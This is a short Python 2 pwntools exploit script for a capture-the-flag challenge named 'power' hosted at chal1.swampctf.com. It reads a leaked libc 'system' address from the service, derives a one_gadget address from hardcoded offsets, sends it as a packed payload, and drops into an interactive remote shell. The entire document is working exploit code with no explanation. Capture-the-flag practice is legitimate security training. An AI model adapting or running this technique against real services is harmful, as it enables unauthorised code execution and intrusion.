#!/usr/bin/env python2
from pwn import *
import monkeyhex
import struct
import binascii

HOST = "chal1.swampctf.com"
PORT = 1999

file_path = "./power"
libc_path = "./libc.so.6"
proc_args = []

gdb_bps = []
gdb_bps += []
gdb_cmd = []
gdb_cmd += []
gdb_cmd += ["break *" + hex(x) for x in gdb_bps]
gdb_cmd += ['break *(main+0xf8)']
gdb_cmd += ['c']
gdb_cmd = '\n'.join(gdb_cmd)

gdb_env = {'LD_PRELOAD': 'libc.so.6'}

context.binary = file_path
context.log_level = 'debug'
context.terminal = ['konsole', '-e']

#proc = process(file_path)
proc = remote(HOST, PORT)
#proc = gdb.debug(file_path, env=gdb_env)
#elf = ELF(file_path)
#libc = ELF(libc_path)

system_offset = 0x45390
one_gadget_offset = 0x45216

proc.sendlineafter("(yes/no): ", "yes")
proc.recvuntil("mage hands")
payload = int(proc.recvline().split("0x")[1][:-2], 16) - system_offset + one_gadget_offset
print hex(payload)
payload = struct.pack("<Q", payload)
print payload
proc.sendafter("ord: ", payload)
proc.sendline("ls")
proc.interactive()
